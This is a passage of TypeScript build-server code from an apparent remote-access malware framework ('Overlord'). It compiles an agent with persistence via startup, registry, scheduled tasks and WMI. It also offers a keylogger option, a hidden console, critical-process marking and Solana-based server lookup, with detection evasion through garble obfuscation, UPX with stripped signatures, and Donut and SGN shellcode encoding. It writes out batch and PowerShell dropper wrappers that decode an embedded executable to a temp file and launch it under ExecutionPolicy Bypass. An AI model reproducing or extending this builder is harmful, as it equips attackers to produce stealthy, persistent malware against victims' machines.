          env.PATH = `${extraBinDir}${sep}${env.PATH || process.env.PATH || ""}`;
        }
      }

      if (effectiveOs === "windows" && env.CGO_ENABLED === "1") {
        ensureNVCodecHeaderForWindowsCgo(clientDir, sendToStream);
      }

      let ldflags = config.stripDebug !== false ? "-s -w -buildid=" : "";

      if (config.serverUrl) {
        const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
        ldflags = `${ldflags} ${serverFlag}`;
        sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
      }

      if (config.rawServerList) {
        const rawServerFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsRaw=true";
        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
      }

      if (config.solMemo) {
        const solFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsSol=true";
        ldflags = ldflags ? `${ldflags} ${solFlag}` : solFlag;
        sendToStream({ type: "output", text: "Solana memo lookup: enabled\n", level: "info" });

        if (config.solAddress) {
          const solAddrFlag = `-X overlord-client/cmd/agent/config.DefaultSolAddress=${config.solAddress}`;
          ldflags = `${ldflags} ${solAddrFlag}`;
          sendToStream({ type: "output", text: `Solana address: ${config.solAddress}\n`, level: "info" });
        }

        if (config.solRpcEndpoints) {
          const solRpcFlag = `-X overlord-client/cmd/agent/config.DefaultSolRPCEndpoints=${config.solRpcEndpoints}`;
          ldflags = `${ldflags} ${solRpcFlag}`;
          sendToStream({ type: "output", text: `Solana RPC endpoints: ${config.solRpcEndpoints}\n`, level: "info" });
        }
      }

      if (buildMutex) {
        const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
      }

      if (config.enablePersistence) {
        if (!platform.startsWith('android-')) {
          const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
          ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
          const activeMethods = config.persistenceMethods && config.persistenceMethods.length > 0
            ? config.persistenceMethods
            : ['startup'];
          sendToStream({ type: "output", text: `Persistence enabled for ${platform} (methods: ${activeMethods.join(', ')})\n`, level: "info" });
          if (config.startupName) {
            const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
            ldflags = `${ldflags} ${startupNameFlag}`;
            sendToStream({ type: "output", text: `Startup name: ${config.startupName}\n`, level: "info" });
          }
        } else {
          sendToStream({ type: "output", text: `Persistence is not supported on ${platform}, skipping...\n`, level: "warning" });
        }
      }

      if (buildAgentToken) {
        const agentTokenFlag = `-X overlord-client/cmd/agent/config.DefaultAgentToken=${buildAgentToken}`;
        ldflags = ldflags ? `${ldflags} ${agentTokenFlag}` : agentTokenFlag;
      }

      if (buildTag) {
        const buildTagFlag = `-X overlord-client/cmd/agent/config.DefaultBuildTag=${buildTag}`;
        ldflags = ldflags ? `${ldflags} ${buildTagFlag}` : buildTagFlag;
      }

      if (config.sleepSeconds && config.sleepSeconds > 0) {
        const sleepFlag = `-X overlord-client/cmd/agent/config.DefaultSleepSeconds=${config.sleepSeconds}`;
        ldflags = ldflags ? `${ldflags} ${sleepFlag}` : sleepFlag;
        sendToStream({ type: "output", text: `Startup sleep: ${config.sleepSeconds}s\n`, level: "info" });
      }

      if (config.fetchPublicIP) {
        const publicIPFlag = "-X overlord-client/cmd/agent/config.DefaultFetchPublicIP=true";
        ldflags = ldflags ? `${ldflags} ${publicIPFlag}` : publicIPFlag;
        sendToStream({ type: "output", text: "Public IP lookup enabled (api.ipify.org)\n", level: "info" });
      }

      if (config.hideConsole && os === "windows") {
        const hideConsoleFlag = "-H=windowsgui";
        ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
        sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
      }

      if (config.criticalProcess && os === "windows") {
        const criticalFlag = "-X overlord-client/cmd/agent/config.DefaultCriticalProcess=true";
        ldflags = ldflags ? `${ldflags} ${criticalFlag}` : criticalFlag;
        sendToStream({ type: "output", text: "Critical process: enabled (requires admin at runtime)\n", level: "info" });
      }

      if (config.obfuscate) {
        sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
        if (config.garbleLiterals) {
          sendToStream({ type: "output", text: "Garble: obfuscate literals (-literals)\n", level: "info" });
        }
        if (config.garbleTiny) {
          sendToStream({ type: "output", text: "Garble: tiny mode (-tiny)\n", level: "info" });
        }
        if (config.garbleSeed) {
          sendToStream({ type: "output", text: `Garble: seed=${config.garbleSeed}\n`, level: "info" });
        }
      }

      if (config.noPrinting) {
        const secureLogPublicKey = getClientLogPublicKey();
        if (secureLogPublicKey) {
          const secureLogFlag = `-X overlord-client/cmd/agent/config.DefaultSecureLogPublicKey=${secureLogPublicKey}`;
          ldflags = ldflags ? `${ldflags} ${secureLogFlag}` : secureLogFlag;
        }
        sendToStream({ type: "output", text: "Secure client logs enabled (encrypted noprint capture)\n", level: "info" });
      }
      if (config.disableKeylogger) {
        sendToStream({ type: "output", text: "Keylogger disabled (nokeylogger tag)\n", level: "info" });
      }

      // Linux CGO builds must be fully statically linked to avoid glibc version
      // mismatches between the build server and target machines.
      if (os === "linux" && env.CGO_ENABLED === "1") {
        const staticFlag = "-extldflags '-static'";
        ldflags = ldflags ? `${ldflags} ${staticFlag}` : staticFlag;
        sendToStream({ type: "output", text: "Linux CGO: static linking enabled (avoids GLIBC version mismatch)\n", level: "info" });
      }

      // Compile the plugin host shim so the agent can embed it via //go:embed.
      // The shim is a small dynamically-linked binary that dlopen()s plugins on
      // behalf of the statically-linked agent (static musl cannot call dlopen).
      // We use the native 'cc' for amd64 (glibc, works on most servers) and the
      // musl cross-compiler for arm targets (works on musl/Alpine targets).
      if (os === "linux" && env.CGO_ENABLED === "1") {
        const pluginHostSrc = path.join(clientDir, "cmd/agent/plugins/plugin_host/plugin_host.c");
        if (fs.existsSync(pluginHostSrc)) {
          const archSuffix = actualArch === "amd64" ? "amd64"
                           : actualArch === "arm64" ? "arm64"
                           : "arm";
          const pluginHostOut = path.join(clientDir, `cmd/agent/plugins/plugin_host/plugin_host_${archSuffix}`);
          // For amd64 compile a fully static glibc binary (-static -ldl) so the
          // shim has no shared library dependencies and runs on any glibc version.
          // Static glibc can still call dlopen at runtime via the system ld-linux.so.2.
          // For cross-compiled arches use env.CC (musl cross-compiler) without -static.
          const hostCC = actualArch === "amd64" ? "cc" : (env.CC || "cc");
          const shimExtraFlags = actualArch === "amd64" ? ["-static"] : [];
          sendToStream({ type: "output", text: `Compiling plugin host shim (${archSuffix}) with ${hostCC}...\n`, level: "info" });
          try {
            const compileProc = $`${hostCC} -O2 -o ${pluginHostOut} ${pluginHostSrc} ${shimExtraFlags} -ldl`.nothrow();
            let compileOut = "";
            for await (const line of compileProc.lines()) { compileOut += line + "\n"; }
            const compileResult = await compileProc;
            if (compileResult.exitCode !== 0) {
              sendToStream({ type: "output", text: `Warning: plugin host shim compilation failed — plugins will fall back to direct dlopen:\n${compileOut}\n`, level: "warn" });
            } else {
              sendToStream({ type: "output", text: `Plugin host shim compiled: ${pluginHostOut}\n`, level: "info" });
            }
          } catch (err: any) {
            sendToStream({ type: "output", text: `Warning: plugin host shim compilation error — ${err?.message || err}\n`, level: "warn" });
          }
        }
      }

      const isShellcodeMode = !!(config.useDonut || config.useLinuxShellcode);

      try {
        logger.info(`[build:${buildId.substring(0, 8)}] GOOS=${os} GOARCH=${actualArch} CGO=${env.CGO_ENABLED} CC=${env.CC || "<default>"} shellcode=${isShellcodeMode}`);

        const garbleFlags: string[] = [];
        if (config.obfuscate) {
          if (config.garbleLiterals) garbleFlags.push("-literals");
          if (config.garbleTiny) garbleFlags.push("-tiny");
          if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
        }

        // Base tags: always present regardless of build pass
        let baseTags: string[] = [];
        if (config.noPrinting) baseTags.push("noprint");
        if (config.disableKeylogger) baseTags.push("nokeylogger");
        if (config.enableWebrtc) baseTags.push("overlord_webrtc");
        if (config.enableWinRE && os === "windows") baseTags.push("overlord_winre");
        if (hasBoundFiles) baseTags.push("hasbinder");
        if (isIosTarget) baseTags.push("ios_target");
        if (config.shellcodeConsole && isShellcodeMode && os === "windows") baseTags.push("shellcode_console");
        if (config.fetchPublicIP) baseTags.push("fetch_public_ip");

        // Windows persistence tags (omitted in shellcode mode — handled by two-pass below)
        let winPersistTags: string[] = [];
        if (config.enablePersistence && os === "windows" && !isShellcodeMode) {
          const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
          if (methods.includes("startup")) winPersistTags.push("persist_startup");
          if (methods.includes("registry")) winPersistTags.push("persist_registry");
          if (methods.includes("taskscheduler")) winPersistTags.push("persist_taskscheduler");
          if (methods.includes("wmi")) winPersistTags.push("persist_wmi");
        }

        let skipTarget = false;
        const targetHookPayload = {
          buildId,
          platform,
          os,
          arch: actualArch,
          effectiveOs,
          targetKey,
          outputName,
          friendlyOutputName,
          outputPath: path.join(outDir, outputName),
          outDir,
          clientDir,
          env,
          ldflags,
          tags: [...baseTags, ...winPersistTags],
          baseTags,
          persistenceTags: winPersistTags,
          garbleFlags,
          config,
        };
        for (const item of await runBuildHooks(deps.runBuildHookForAll, "target", targetHookPayload, sendToStream)) {
          if (!isRecord(item.result)) continue;
          if (item.result.skip === true) {
            skipTarget = true;
          }
          if (isRecord(item.result.env)) {
            for (const [key, value] of Object.entries(item.result.env)) {
              if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(key) && value !== null && value !== undefined) {
                env[key] = String(value);
              }
            }
          }
          if (typeof item.result.ldflags === "string") {
            ldflags = item.result.ldflags;
          }
          if (typeof item.result.ldflagsAppend === "string" && item.result.ldflagsAppend.trim()) {
            ldflags = ldflags ? `${ldflags} ${item.result.ldflagsAppend.trim()}` : item.result.ldflagsAppend.trim();
          }
          if (Array.isArray(item.result.removeTags)) {
            const remove = new Set(item.result.removeTags.filter((tag: unknown) => typeof tag === "string"));
            baseTags = baseTags.filter((tag) => !remove.has(tag));
            winPersistTags = winPersistTags.filter((tag) => !remove.has(tag));
          }
          if (Array.isArray(item.result.tags)) {
            baseTags = item.result.tags.filter((tag: unknown) => typeof tag === "string" && tag.trim()).map((tag: string) => tag.trim());
            winPersistTags = [];
          }
          if (Array.isArray(item.result.addTags)) {
            for (const tag of item.result.addTags) {
              if (typeof tag === "string" && tag.trim() && !baseTags.includes(tag.trim())) {
                baseTags.push(tag.trim());
              }
            }
          }
          if (typeof item.result.outputName === "string" && item.result.outputName.trim()) {
            outputName = deps.sanitizeOutputName(item.result.outputName.trim());
          }
          if (typeof item.result.friendlyOutputName === "string" && item.result.friendlyOutputName.trim()) {
            friendlyOutputName = deps.sanitizeOutputName(item.result.friendlyOutputName.trim());
          }
        }
        if (skipTarget) {
          sendToStream({ type: "output", text: `Skipping ${platform}; requested by server plugin hook.\n`, level: "warn" });
          continue;
        }

        const runBuild = async (tags: string[], outputPath: string) => {
          const buildArgs: string[] = [];
          if (tags.length > 0) buildArgs.push("-tags", tags.join(" "));
          buildArgs.push("-trimpath", "-buildvcs=false");
          if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
          buildArgs.push("-o", outputPath, "./cmd/agent");
          let buildCmd;
          if (config.obfuscate) {
            buildCmd = $`garble ${[...garbleFlags, "build", ...buildArgs]}`;
          } else {
            buildCmd = $`go build ${buildArgs}`;
          }
          const proc = buildCmd.env(env).cwd(clientDir).nothrow();
          for await (const line of proc.lines()) {
            const trimmed = line.trim();
            if (trimmed.length > 0) sendToStream({ type: "output", text: line + "\n", level: "info" });
          }
          const result = await proc;
          if (result.exitCode !== 0) {
            const stderrText = result.stderr.toString();
            if (stderrText) sendToStream({ type: "output", text: stderrText, level: "error" });
            throw new Error(`Build failed for ${platform} (exit ${result.exitCode})`);
          }
        };

        // Two-pass build: shellcode + persistence
        if (isShellcodeMode && config.enablePersistence && !platform.startsWith("android-")) {
          const pass1Path = `${outDir}/${outputName}.pass1`;
          const pass1Tags = [...baseTags];
          if (os === "windows") {
            const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
            if (methods.includes("startup")) pass1Tags.push("persist_startup");
            if (methods.includes("registry")) pass1Tags.push("persist_registry");
            if (methods.includes("taskscheduler")) pass1Tags.push("persist_taskscheduler");
            if (methods.includes("wmi")) pass1Tags.push("persist_wmi");
          }
          sendToStream({ type: "output", text: `Two-pass shellcode+persistence build\n  Pass 1: agent with persistence (tags: ${pass1Tags.join(" ")})\n`, level: "info" });
          await runBuild(pass1Tags, pass1Path);

          const pass1Data = fs.readFileSync(pass1Path);
          const selfbinPath = path.join(clientDir, "cmd", "agent", "selfbinary.bin");
          fs.writeFileSync(selfbinPath, pass1Data);
          fs.unlinkSync(pass1Path);

          const pass2Tags = [...baseTags, "selfembed"];
          sendToStream({ type: "output", text: `  Pass 2: selfembed wrapper (tags: ${pass2Tags.join(" ")})\n`, level: "info" });
          await runBuild(pass2Tags, `${outDir}/${outputName}`);
          try { fs.unlinkSync(selfbinPath); } catch {}
        } else {
          const tags = [...baseTags, ...winPersistTags];
          await runBuild(tags, `${outDir}/${outputName}`);
        }

        const filePath = `${outDir}/${outputName}`;
        let finalSize = Bun.file(filePath).size;
        await runBuildHooks(
          deps.runBuildHookForAll,
          "post_build",
          buildTransformHookPayload({
            buildId,
            stage: "post_build",
            platform,
            os,
            arch: actualArch,
            targetKey,
            outDir,
            clientDir,
            filename: outputName,
            filePath,
            size: finalSize,
            config,
          }),
          sendToStream,
        );
        // For script outputs: go build writes a PE binary; UPX must run first (it needs PE format),
        // then after compression we wrap it in a script with an embedded base64 payload.
        const isBatchWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
        const isPowerShellWrapper = os === "windows" && winExt === ".ps1";

        if (upxBin) {
          await runBuildHooks(
            deps.runBuildHookForAll,
            "before_upx",
            buildTransformHookPayload({
              buildId,
              stage: "before_upx",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: outputName,
              filePath,
              size: finalSize,
              config,
              extra: { upxBin },
            }),
            sendToStream,
          );
          sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
          const originalSize = finalSize;
          try {
            const upxResult = await $`${upxBin} --best ${filePath}`.nothrow().quiet();
            if (upxResult.exitCode !== 0) {
              const stderr = upxResult.stderr.toString().trim();
              sendToStream({ type: "output", text: `WARNING: UPX compression failed (exit ${upxResult.exitCode}): ${stderr}\n`, level: "warn" });
            } else {
              finalSize = Bun.file(filePath).size;
              const ratio = ((1 - finalSize / originalSize) * 100).toFixed(1);
              sendToStream({ type: "output", text: `UPX compressed: ${originalSize} → ${finalSize} bytes (${ratio}% reduction)\n`, level: "info" });

              if (config.upxStripHeaders) {
                const stripped = stripUpxHeaders(filePath);
                if (stripped) {
                  finalSize = Bun.file(filePath).size;
                  sendToStream({ type: "output", text: `UPX headers stripped (signature removed)\n`, level: "info" });
                } else {
                  sendToStream({ type: "output", text: `WARNING: No UPX signatures found to strip\n`, level: "warn" });
                }
              }
            }
          } catch (upxErr: any) {
            sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
          }
          await runBuildHooks(
            deps.runBuildHookForAll,
            "after_upx",
            buildTransformHookPayload({
              buildId,
              stage: "after_upx",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: outputName,
              filePath,
              size: finalSize,
              config,
              extra: { upxBin, originalSize },
            }),
            sendToStream,
          );
        }

        if (isBatchWrapper || isPowerShellWrapper) {
          await runBuildHooks(
            deps.runBuildHookForAll,
            "before_script_wrapper",
            buildTransformHookPayload({
              buildId,
              stage: "before_script_wrapper",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: outputName,
              filePath,
              size: finalSize,
              config,
              extra: { extension: winExt },
            }),
            sendToStream,
          );
          sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
          try {
            const exeBytes = fs.readFileSync(filePath);
            const b64 = exeBytes.toString("base64");
            // Split into 76-char lines so the script stays manageable.
            const b64Lines = b64.match(/.{1,76}/g) || [b64];
            const markerCore = `OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
            let wrapper: string;

            if (isPowerShellWrapper) {
              const marker = `# ${markerCore}`;
              wrapper = [
                `$ErrorActionPreference = 'SilentlyContinue'`,
                `$f = $PSCommandPath`,
                `if (-not $f) { $f = $MyInvocation.MyCommand.Path }`,
                `$l = [IO.File]::ReadAllLines($f)`,
                `$i = -1`,
                `for ($j = 0; $j -lt $l.Count; $j++) { if ($l[$j] -ceq '${marker}') { $i = $j + 1; break } }`,
                `if ($i -lt 0) { exit 1 }`,
                `$b = [Convert]::FromBase64String(($l[$i..($l.Count - 1)] -join ''))`,
                `$t = [IO.Path]::Combine([IO.Path]::GetTempPath(), ([Guid]::NewGuid().ToString() + '.exe'))`,
                `[IO.File]::WriteAllBytes($t, $b)`,
                `Start-Process -FilePath $t`,
                `exit 0`,
                marker,
                ...b64Lines,
              ].join("\r\n") + "\r\n";
            } else {
              const marker = `:${markerCore}`;
              // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
              // decodes base64 to a temp .exe, launches it, then exits.
              const psCmd = [
                `$f=$env:_OVD_SELF;`,
                `$l=[IO.File]::ReadAllLines($f);`,
                `$i=0;`,
                `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
                `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
                `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
                `[IO.File]::WriteAllBytes($t,$b);`,
                `Start-Process $t;`,
                `exit`,
              ].join("");
              wrapper = [
                `@echo off`,
                `setlocal`,
                `set "_OVD_SELF=%~f0"`,
                `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
                `endlocal`,
                `exit /b 0`,
                marker,
                ...b64Lines,
              ].join("\r\n") + "\r\n";
            }
            fs.writeFileSync(filePath, wrapper, "utf8");
            finalSize = fs.statSync(filePath).size;
            sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
          } catch (wrapErr: any) {
            sendToStream({ type: "output", text: `WARNING: Failed to generate ${winExt} wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
          }
          await runBuildHooks(
            deps.runBuildHookForAll,
            "after_script_wrapper",
            buildTransformHookPayload({
              buildId,
              stage: "after_script_wrapper",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: outputName,
              filePath,
              size: finalSize,
              config,
              extra: { extension: winExt },
            }),
            sendToStream,
          );
        }

        // ── IPA packaging for iOS targets ──────────────────────────────────────
        if (os === "ios") {
          await runBuildHooks(
            deps.runBuildHookForAll,
            "before_ipa",
            buildTransformHookPayload({
              buildId,
              stage: "before_ipa",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: outputName,
              filePath,
              size: finalSize,
              config,
            }),
            sendToStream,
          );
          sendToStream({ type: "output", text: `Packaging ${outputName} as IPA...\n`, level: "info" });
          try {
            const appName = config.outputName || "Agent";
            const bundleId = config.iosBundleId || "com.overlord.agent";
            const ipaWorkDir = path.join(outDir, `_ipa_${platform}`);
            const payloadAppDir = path.join(ipaWorkDir, "Payload", `${appName}.app`);

            // Create Payload/App.app structure
            fs.mkdirSync(payloadAppDir, { recursive: true });

            // Copy binary into .app
            fs.copyFileSync(filePath, path.join(payloadAppDir, appName));
            fs.chmodSync(path.join(payloadAppDir, appName), 0o755);

            // Generate Info.plist
            const infoPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CFBundleExecutable</key>
	<string>${appName}</string>
	<key>CFBundleIdentifier</key>
	<string>${bundleId}</string>
	<key>CFBundleName</key>
	<string>${appName}</string>
	<key>CFBundleDisplayName</key>
	<string>${appName}</string>
	<key>CFBundleVersion</key>
	<string>${agentVersion}</string>
	<key>CFBundleShortVersionString</key>
	<string>${agentVersion}</string>
	<key>CFBundlePackageType</key>
	<string>APPL</string>
	<key>CFBundleSupportedPlatforms</key>
	<array>
		<string>iPhoneOS</string>
	</array>
	<key>MinimumOSVersion</key>
	<string>14.0</string>
	<key>CFBundleInfoDictionaryVersion</key>
	<string>6.0</string>
	<key>LSRequiresIPhoneOS</key>
	<true/>
	<key>UIDeviceFamily</key>
	<array>
		<integer>1</integer>
		<integer>2</integer>
	</array>
	<key>UISupportedInterfaceOrientations</key>
	<array>
		<string>UIInterfaceOrientationPortrait</string>
	</array>
</dict>
</plist>`;
            fs.writeFileSync(path.join(payloadAppDir, "Info.plist"), infoPlist, "utf8");

            // Attempt pseudo-signing with ldid (system-installed or downloaded on demand).
            try {
              let ldidBin: string | null = null;
              try {
                const tc = await ensureToolchain("ldid", sendToStream);
                ldidBin = path.join(tc.binDir, "ldid");
              } catch (dlErr: any) {
                sendToStream({
                  type: "output",
                  text: `ldid not found and download failed (${dlErr.message || dlErr}); skipping pseudo-signing.\n`,
                  level: "warn",
                });
              }
              if (ldidBin) {
                const ldidSign = await $`${ldidBin} -S ${path.join(payloadAppDir, appName)}`.nothrow().quiet();
                if (ldidSign.exitCode === 0) {
                  sendToStream({ type: "output", text: `Pseudo-signed with ldid\n`, level: "info" });
                } else {
                  sendToStream({ type: "output", text: `WARNING: ldid signing failed (non-fatal)\n`, level: "warn" });
                }
              }
            } catch { /* ldid is optional */ }

            const ipaName = `${outputName}.ipa`;
            const ipaPath = path.join(outDir, ipaName);
            const zipResult = await $`cd ${ipaWorkDir} && zip -r ${ipaPath} Payload/ 2>&1 || true`.nothrow().quiet();

            // Fallback: if system zip isn't available, try creating it manually
            if (!fs.existsSync(ipaPath)) {
              // Use a simple tar+gzip approach as last resort — though real IPAs need zip
              sendToStream({ type: "output", text: `WARNING: zip command not available. Outputting raw Mach-O binary instead of IPA.\n`, level: "warn" });
            } else {
              // Remove the raw binary, replace with IPA
              fs.unlinkSync(filePath);
              finalSize = fs.statSync(ipaPath).size;
              sendToStream({ type: "output", text: `IPA packaged: ${finalSize} bytes\n`, level: "info" });

              // Update output references to point to the IPA
              const ipaOutputName = outputName.endsWith(".ipa") ? outputName : `${outputName}.ipa`;

              // Clean up temp dirs
              fs.rmSync(ipaWorkDir, { recursive: true, force: true });

              await runBuildHooks(
                deps.runBuildHookForAll,
                "after_ipa",
                buildTransformHookPayload({
                  buildId,
                  stage: "after_ipa",
                  platform,
                  os,
                  arch: actualArch,
                  targetKey,
                  outDir,
                  clientDir,
                  filename: ipaOutputName,
                  filePath: ipaPath,
                  size: finalSize,
                  config,
                  extra: { inputFilename: outputName },
                }),
                sendToStream,
              );

              // Push IPA file entry instead of raw binary
              (build.files as any[]).push({
                name: ipaOutputName.replace(`-${buildSlug}`, ""),
                filename: ipaOutputName,
                platform,
                version: agentVersion,
                size: finalSize,
              });
              continue; // Skip the default file push below
            }

            // Clean up temp dirs
            fs.rmSync(ipaWorkDir, { recursive: true, force: true });
          } catch (ipaErr: any) {
            sendToStream({ type: "output", text: `WARNING: IPA packaging failed: ${ipaErr.message || ipaErr}. Output is a raw Mach-O binary.\n`, level: "warn" });
          }
        }
        // ── End IPA packaging ─────────────────────────────────────────────────

        // ── Donut: Windows PE → shellcode ──────────────────────────────────
        let finalOutputName = outputName;
        let finalOutputSize = finalSize;

        let shellcodeBinPath: string | null = null;
        let shellcodeArch: "amd64" | "386" | null = null;

        if (config.useDonut && os === "windows") {
          sendToStream({ type: "status", text: `Converting ${platform} PE to shellcode…` });
          sendToStream({ type: "output", text: `\nConverting PE → shellcode with Donut...\n`, level: "info" });
          const scOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^.]+$/, ".bin"));
          const binPath = path.join(outDir, scOutputName);
          const donutArch = (actualArch === "386" ? "386" : "amd64") as "386" | "amd64";
          await runBuildHooks(
            deps.runBuildHookForAll,
            "before_donut",
            buildTransformHookPayload({
              buildId,
              stage: "before_donut",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: finalOutputName,
              filePath,
              size: finalOutputSize,
              config,
              extra: { outputFilename: scOutputName, outputPath: binPath, donutArch },
            }),
            sendToStream,
          );
          const ok = await runDonut(filePath, binPath, donutArch, sendToStream);
          if (!ok) throw new Error(`Donut shellcode conversion failed for ${platform}`);
          try { fs.unlinkSync(filePath); } catch {}
          finalOutputName = scOutputName;
          finalOutputSize = Bun.file(binPath).size;
          shellcodeBinPath = binPath;
          shellcodeArch = donutArch;
          await runBuildHooks(
            deps.runBuildHookForAll,
            "after_donut",
            buildTransformHookPayload({
              buildId,
              stage: "after_donut",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: finalOutputName,
              filePath: binPath,
              size: finalOutputSize,
              config,
              extra: { inputFilename: outputName, donutArch },
            }),
            sendToStream,
          );
          sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
        }

        // ── Linux ELF → shellcode stub ──────────────────────────────────────
        if (config.useLinuxShellcode && os === "linux") {
          sendToStream({ type: "status", text: `Wrapping ${platform} ELF as shellcode…` });
          sendToStream({ type: "output", text: `\nWrapping ELF with Linux shellcode stub...\n`, level: "info" });
          const scOutputName = deps.sanitizeOutputName(outputName + ".bin");
          const binPath = path.join(outDir, scOutputName);
          await runBuildHooks(
            deps.runBuildHookForAll,
            "before_linux_shellcode",
            buildTransformHookPayload({
              buildId,
              stage: "before_linux_shellcode",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: finalOutputName,
              filePath,
              size: finalOutputSize,
              config,
              extra: { outputFilename: scOutputName, outputPath: binPath },
            }),
            sendToStream,
          );
          const ok = buildLinuxShellcode(filePath, binPath, sendToStream);
          if (!ok) throw new Error(`Linux shellcode wrap failed for ${platform}`);
          try { fs.unlinkSync(filePath); } catch {}
          finalOutputName = scOutputName;
          finalOutputSize = Bun.file(binPath).size;
          shellcodeBinPath = binPath;
          shellcodeArch = "amd64";
          await runBuildHooks(
            deps.runBuildHookForAll,
            "after_linux_shellcode",
            buildTransformHookPayload({
              buildId,
              stage: "after_linux_shellcode",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: finalOutputName,
              filePath: binPath,
              size: finalOutputSize,
              config,
              extra: { inputFilename: outputName },
            }),
            sendToStream,
          );
          sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
        }

        if (config.useSgn && shellcodeBinPath && shellcodeArch) {
          const iters = Math.max(1, Math.min(50, Math.floor(config.sgnIterations ?? 1)));
          sendToStream({ type: "status", text: `Encoding ${platform} shellcode with SGN (×${iters})…` });
          sendToStream({ type: "output", text: `\nEncoding shellcode with SGN (${iters} iteration${iters === 1 ? "" : "s"})...\n`, level: "info" });
          const sgnOutputName = deps.sanitizeOutputName(finalOutputName + ".sgn");
          const sgnOutputPath = path.join(outDir, sgnOutputName);
          await runBuildHooks(
            deps.runBuildHookForAll,
            "before_sgn",
            buildTransformHookPayload({
              buildId,
              stage: "before_sgn",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: finalOutputName,
              filePath: shellcodeBinPath,
              size: finalOutputSize,
              config,
              extra: { outputFilename: sgnOutputName, outputPath: sgnOutputPath, shellcodeArch, iterations: iters },
            }),
            sendToStream,
          );
          const ok = await runSgn(shellcodeBinPath, sgnOutputPath, shellcodeArch, iters, sendToStream);
          if (!ok) throw new Error(`SGN encoding failed for ${platform}`);
          try { fs.unlinkSync(shellcodeBinPath); } catch {}
          finalOutputName = sgnOutputName;
          finalOutputSize = Bun.file(sgnOutputPath).size;
          shellcodeBinPath = sgnOutputPath;
          await runBuildHooks(
            deps.runBuildHookForAll,
            "after_sgn",
            buildTransformHookPayload({
              buildId,
              stage: "after_sgn",
              platform,
              os,
              arch: actualArch,
              targetKey,
              outDir,
              clientDir,
              filename: finalOutputName,
              filePath: sgnOutputPath,
              size: finalOutputSize,
              config,
              extra: { shellcodeArch, iterations: iters },
            }),
            sendToStream,
          );
          sendToStream({ type: "output", text: `SGN-encoded shellcode: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });

          if (config.outputSgnTxt) {
            sendToStream({ type: "status", text: `Writing ${platform} SGN output as TXT…` });
            const txtOutputName = deps.sanitizeOutputName(`${finalOutputName}.txt`);
            const txtOutputPath = path.join(outDir, txtOutputName);
            await runBuildHooks(
              deps.runBuildHookForAll,
              "before_sgn_txt",
              buildTransformHookPayload({
                buildId,
                stage: "before_sgn_txt",
                platform,
                os,
                arch: actualArch,
                targetKey,
                outDir,
                clientDir,
                filename: finalOutputName,
                filePath: sgnOutputPath,
                size: finalOutputSize,
                config,
                extra: { outputFilename: txtOutputName, outputPath: txtOutputPath, shellcodeArch, iterations: iters },
              }),
              sendToStream,
            );
            const txtSize = writeSgnTextArtifact(sgnOutputPath, txtOutputPath, platform, shellcodeArch, iters);
            try { fs.unlinkSync(sgnOutputPath); } catch {}
            finalOutputName = txtOutputName;
            finalOutputSize = txtSize;
            shellcodeBinPath = txtOutputPath;
